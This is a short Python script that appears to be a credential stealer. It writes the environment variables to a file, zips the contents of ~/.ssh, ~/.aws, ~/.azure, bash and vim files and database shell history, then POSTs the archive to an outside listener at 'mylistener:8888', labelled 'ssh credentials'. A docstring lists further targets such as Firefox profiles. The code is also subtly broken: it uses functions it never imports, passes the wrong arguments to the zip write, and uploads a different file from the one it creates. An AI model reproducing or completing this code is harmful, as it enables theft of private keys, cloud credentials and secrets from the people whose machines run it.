import requests, os, zipfile
from zipfile import ZipFile


# interesting directories
"""
~/.ssh
~/.aws/
 ~/.azure/
~/Library/Application Support/Firefox/Profiles/<profilename>.default or 

Also other interesting files - osx/linux will have shell stuff like .bash* files, devs may have vim stuff or database shell histories.

if in a shell environment it's good to grab the ENV vars

TODO:
    - expand list as a dict or a pickle for a larger set of scrape files
"""
# grab environment variables
envs = os.environ
with open('envs_file.txt','w') as f:
    f.write(str(envs))

paths = ['envs_file.txt','~/.ssh','~/.azure','~/.aws','~/.bashrc','~/.bash_profile','~/.bash_aliases','~/.bash_profile','~/.vimrc','~/.viminfo','~/.dbshell']

# create the zip
zipObj = ZipFile('test.zip', 'w')

# Populate the zip
for path in paths:
    p = os.path.expanduser(path)
    [zipObj.write(mypath, f) for f in listdir(p) if isfile(join(p, f))]


# Close the zip
zipObj.close()


# post the file
url = 'http://mylistener:8888'
files={"archive": ("test.zip", open('sample.zip','rb'))}
values = {'bootytype': 'ssh credentials'}
r = requests.post(url, files=files, data=values)
#
